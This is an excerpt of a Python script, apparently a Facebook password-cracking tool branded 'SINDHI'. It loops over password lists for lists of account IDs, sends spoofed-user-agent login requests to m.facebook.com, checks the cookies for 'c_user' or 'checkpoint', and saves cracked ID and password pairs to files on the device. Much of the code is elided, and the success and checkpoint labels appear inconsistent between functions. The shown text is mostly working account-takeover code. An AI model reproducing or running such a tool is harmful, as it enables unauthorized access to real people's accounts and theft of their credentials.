...
`8.`8888.      ,8' d888888o.   8 888888888o   
 `8.`8888.    ,8'.`8888:' `88. 8 8888    `88. 
  `8.`8888.  ,8' 8.`8888.   Y8 8 8888     `88 
   `8.`8888.,8'  `8.`8888.     8 8888     ,88 
    `8.`88888'    `8.`8888.    8 8888.   ,88' 
     `8. 8888      `8.`8888.   8 8888888888   
      `8 8888       `8.`8888.  8 8888    `88. 
       8 8888   8b   `8.`8888. 8 8888      88 
       8 8888   `8b.  ;8.`8888 8 8888    ,88' 
       8 8888    `Y8888P ,88P' 8 888888888P JSQM
--------------------------------------------------
'\033[1;34m' [+] Owner : Røcky x Raham x Raza
'\033[1;33m' [+] Facebook : Sindhi Team Fb
'\033[1;32m' [+] Version : 0.1
'\033[1;31m' [+] Team : Sindhi Boys
--------------------------------------------------""")
def linex():
	print('\033[1;37m--------------------------------------------------')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> SINDHI TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			...
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/SINDHI.txt')
				linex()
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[SINDHI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[SINDHI-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/SINDHI-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in SHAHBAZ:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[SINDHI-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/SINDHI-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[SINDHI] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[SINDHI-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[SINDHI-CP] '+ids+' | '+pas+'\033[1;97m')
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mSINDHI\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
   ...
   'referer': 'https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Ferror%2Findex.php%3Ferr%3Dec%26kerr%3D1357001%26kerr_summary%3DLog%2Bin%2Bto%2Bcontinue%26kerr_description%3DPlease%2Blog%2Bin%2Bto%2Byour%2Baccount.&ref=104&refsrc=deprecated',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}    
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[SINDHI-CP] '+cid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[SINDHI-OK] '+cid+' | '+ps+'\33[0;97m')
